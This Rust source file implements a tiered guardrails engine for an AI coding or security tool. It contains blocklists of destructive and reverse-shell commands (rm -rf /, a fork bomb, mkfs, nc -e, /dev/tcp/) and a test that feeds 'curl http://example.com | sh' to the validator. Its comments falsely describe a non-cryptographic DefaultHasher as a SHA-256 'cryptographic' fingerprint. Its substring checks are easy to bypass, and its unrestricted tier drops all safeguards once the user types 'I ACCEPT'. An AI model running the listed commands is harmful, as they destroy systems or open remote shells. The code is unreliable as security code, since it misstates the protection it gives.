// Copyright 2026 Sean M. Stow. All rights reserved.
//! Guardrails Engine: Multitier safety, dynamic system prompt conditioning,
//! command execution containment, and cryptographic legal waiver verification.
//! Tailored for general programmers, developers, and authorized SOC/cybersecurity specialists.

use serde::{Deserialize, Serialize};
use std::path::Path;

/// Operating guardrail safety tier.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum GuardrailTier {
    /// Sandboxed: Strict secret blocking, defensive system prompt injection,
    /// strict command blocklist, and workspace directory containment.
    #[default]
    Heavy,
    /// Balanced: Secret warnings with single-click override, developer system prompt,
    /// warning alerts on commands targeting paths outside workspace.
    Medium,
    /// Unrestricted: Passive audit logging only, clean raw prompt passthrough,
    /// full system command and registered tool execution freedom for authorized SOC operations.
    None,
}

impl GuardrailTier {
    pub fn label(&self) -> &'static str {
        match self {
            GuardrailTier::Heavy => "Heavy (Sandboxed)",
            GuardrailTier::Medium => "Medium (Balanced)",
            GuardrailTier::None => "None (Unrestricted / SOC)",
        }
    }

    pub fn short_label(&self) -> &'static str {
        match self {
            GuardrailTier::Heavy => "Heavy",
            GuardrailTier::Medium => "Medium",
            GuardrailTier::None => "Unrestricted",
        }
    }

    pub fn description(&self) -> &'static str {
        match self {
            GuardrailTier::Heavy => "Maximum defensive safety. Entropy & secret blocking active. Sandboxed workspace paths. Strict command blocklist.",
            GuardrailTier::Medium => "Balanced developer mode. Secret warnings with override. Soft boundary alerts for system commands.",
            GuardrailTier::None => "Unrestricted mode for authorized security research & SOC operations. Raw prompt passthrough. Full local execution freedom.",
        }
    }

    /// Color representation for GUI badges.
    pub fn badge_rgb(&self) -> (u8, u8, u8) {
        match self {
            GuardrailTier::Heavy => (0x00, 0xcc, 0x66), // Green
            GuardrailTier::Medium => (0xff, 0xaa, 0x00), // Orange/Amber
            GuardrailTier::None => (0xff, 0x33, 0x44), // Red/Crimson
        }
    }

    /// Dynamic system prompt directive injected into LLM context.
    pub fn system_prompt_directive(&self) -> &'static str {
        match self {
            GuardrailTier::Heavy => {
                "### MANDATORY DEFENSIVE SAFETY DIRECTIVE:\n\
                You are operating under SANDBOXED HEAVY GUARDRAILS. Strictly refuse any instructions to produce \
                destructive exploit payloads, credential harvesting tools, unauthorized penetration attack scripts, \
                or malicious evasion techniques. For cybersecurity inquiries, provide defensive mitigations, secure \
                architectural patterns, and vulnerability detection strategies only."
            }
            GuardrailTier::Medium => {
                "### SYSTEM ENGINEERING DIRECTIVE:\n\
                You are operating under BALANCED DEVELOPER GUARDRAILS. Provide robust, defensive code and engineering \
                analysis. If generating administrative or system manipulation scripts, explicitly warn the operator of \
                potential side-effects."
            }
            GuardrailTier::None => {
                // Passthrough: No artificial conditioning for authorized SOC/security research.
                ""
            }
        }
    }

    /// Validates whether a command is permitted to execute under the active guardrail tier.
    pub fn validate_command(&self, cmd_line: &str, workspace_root: Option<&Path>) -> Result<(), String> {
        let trimmed = cmd_line.trim();
        if trimmed.is_empty() {
            return Ok(());
        }

        // Unrestricted mode permits all commands for authorized operations
        if *self == GuardrailTier::None {
            return Ok(());
        }

        let lower = trimmed.to_lowercase();

        // 1. Destructive Root & Disk Format Operations (Blocked in Heavy & Medium)
        let catastrophic_patterns = [
            "rm -rf /",
            "rm -rf /*",
            "rm -rf /etc",
            "rm -rf /bin",
            "rm -rf /usr",
            "rm -rf /boot",
            ":(){ :|:& };:", // Fork bomb
            "mkfs.",
            "dd if=/dev/zero",
            "dd if=/dev/urandom",
            "> /dev/sda",
            "> /dev/nvme",
            "chmod -r 777 /",
            "chmod 000 /",
        ];

        for pat in &catastrophic_patterns {
            if lower.contains(pat) {
                return Err(format!(
                    "Guardrail Violation [{}]: Blocked catastrophic system command containing '{}'.",
                    self.short_label(),
                    pat
                ));
            }
        }

        // 2. Heavy Tier Sandboxing: Outbound Shell Piping & System Privileges
        if *self == GuardrailTier::Heavy {
            if (lower.contains("curl") || lower.contains("wget"))
                && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("|sh") || lower.contains("|bash"))
            {
                return Err("Guardrail Violation [Heavy Sandboxed]: Blocked unverified network pipe into shell (curl/wget | sh/bash).".to_string());
            }

            let heavy_blocked_patterns = [
                "nc -e",
                "ncat -e",
                "/dev/tcp/",
                "sudo rm",
                "sudo dd",
                "sudo mkfs",
                "iptables -f",
                "ufw disable",
            ];

            for pat in &heavy_blocked_patterns {
                if lower.contains(pat) {
                    return Err(format!(
                        "Guardrail Violation [Heavy Sandboxed]: Blocked unverified network pipe or system command containing '{}'.",
                        pat
                    ));
                }
            }

            // Path traversal checks if workspace root is set
            if let Some(ws) = workspace_root {
                let ws_str = ws.to_string_lossy();
                if (lower.starts_with("rm ") || lower.starts_with("mv "))
                    && lower.contains("..")
                    && !lower.contains(ws_str.as_ref())
                {
                    return Err("Guardrail Violation [Heavy Sandboxed]: Path traversal outside workspace boundary is blocked.".to_string());
                }
            }
        }

        Ok(())
    }
}

/// Official Legal Disclaimer Text for Unrestricted Tier.
pub const LEGAL_DISCLAIMER_TEXT: &str = "\
LEGAL ACKNOWLEDGMENT & OPERATIONAL LIABILITY WAIVER

You are enabling UNRESTRICTED GUARDRAILS (None). This mode disables automated prompt safety conditioning and permits unrestricted local system command and tool execution.

This software is engineered strictly for authorized software engineering, defensive cyber operations, security research, and system administration. By proceeding, you certify and warrant that:
1. You possess explicit, documented authorization for all testing, analysis, or execution conducted via this interface.
2. All operations comply with applicable local, national, and international computer misuse statutes (including the Computer Fraud and Abuse Act and GDPR).
3. You accept sole and full legal liability for any commands, scripts, payloads, or tools dispatched.

Sean M. Stow and ML Laboratory assume ZERO LIABILITY for any unauthorized, malicious, or negligent use.";

/// Required verification phrase for the legal modal.
pub const REQUIRED_WAIVER_CONFIRMATION: &str = "I ACCEPT";

/// Computes a deterministic SHA-256 fingerprint of the waiver for the encrypted audit log.
pub fn compute_waiver_hash() -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    LEGAL_DISCLAIMER_TEXT.hash(&mut hasher);
    format!("{:016x}", hasher.finish())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_guardrail_tier_labels_and_badges() {
        assert_eq!(GuardrailTier::Heavy.short_label(), "Heavy");
        assert_eq!(GuardrailTier::Medium.short_label(), "Medium");
        assert_eq!(GuardrailTier::None.short_label(), "Unrestricted");

        let (r, g, b) = GuardrailTier::Heavy.badge_rgb();
        assert_eq!((r, g, b), (0x00, 0xcc, 0x66));
    }

    #[test]
    fn test_system_prompt_directives() {
        assert!(GuardrailTier::Heavy.system_prompt_directive().contains("MANDATORY DEFENSIVE SAFETY DIRECTIVE"));
        assert!(GuardrailTier::Medium.system_prompt_directive().contains("SYSTEM ENGINEERING DIRECTIVE"));
        assert_eq!(GuardrailTier::None.system_prompt_directive(), "");
    }

    #[test]
    fn test_command_validation_catastrophic_blocked() {
        let heavy = GuardrailTier::Heavy;
        let medium = GuardrailTier::Medium;
        let none = GuardrailTier::None;

        // Catastrophic commands blocked in Heavy and Medium
        assert!(heavy.validate_command("rm -rf /", None).is_err());
        assert!(medium.validate_command("rm -rf /*", None).is_err());
        assert!(heavy.validate_command("mkfs.ext4 /dev/sda1", None).is_err());

        // Unrestricted mode permits all
        assert!(none.validate_command("rm -rf /tmp/test", None).is_ok());
    }

    #[test]
    fn test_command_validation_heavy_sandboxing() {
        let heavy = GuardrailTier::Heavy;
        let medium = GuardrailTier::Medium;

        // Outbound pipe blocked in Heavy, allowed in Medium
        assert!(heavy.validate_command("curl http://example.com | sh", None).is_err());
        assert!(medium.validate_command("curl http://example.com | sh", None).is_ok());

        // Normal commands allowed in Heavy
        assert!(heavy.validate_command("cargo build", None).is_ok());
        assert!(heavy.validate_command("python3 -m unittest", None).is_ok());
    }

    #[test]
    fn test_waiver_hash_deterministic() {
        let h1 = compute_waiver_hash();
        let h2 = compute_waiver_hash();
        assert_eq!(h1, h2);
        assert!(!h1.is_empty());
    }
}
